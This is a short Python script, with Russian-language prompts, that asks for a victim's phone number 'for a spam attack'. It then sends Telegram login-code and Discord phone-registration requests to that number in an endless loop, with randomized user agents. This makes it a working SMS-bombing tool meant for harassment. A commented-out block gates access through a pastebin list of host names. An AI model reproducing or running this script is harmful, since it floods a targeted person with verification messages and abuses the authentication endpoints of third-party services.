import requests
import fake_useragent
import os
import colorama
import socket
import getpass

blue = colorama.Fore.LIGHTBLUE_EX
green = colorama.Fore.LIGHTGREEN_EX
red = colorama.Fore.LIGHTRED_EX

# device_name = socket.gethostname()
# r = requests.get("https://pastebin.com/wTCRZb7Y")
# if str(device_name) in r.text:
user = fake_useragent.UserAgent().random
headers = {'user_agent': user}
number = input(blue + "[?] Введите номер телефона для спам атаки -> ")
count = 0
nomer = number

try:
    while True:
        response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})
        response1 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
        response2 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone': number})
        response3 = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})
        response4 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
        response5 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone': number})
        response6 = requests.post('https://discord.com/api/v9/auth/register/phone', headers=headers, data={"phone": number})

        count += 1
        print(green + f"[!] Запрос {count} успешно отправлен на номер {number}")
except Exception as e:
    print(red + '[!] произошла ошибка, перепроверьте вводимые данные')
    getpass.getpass(blue + "Нажмите ENTER для возврата в главное меню\n")
    os.system("python main.py")
# else:
#     print(red + "[!] Доступ запрещен")
#     getpass.getpass(blue + "[!] Нажмите ENTER для выхода...")
#     exit()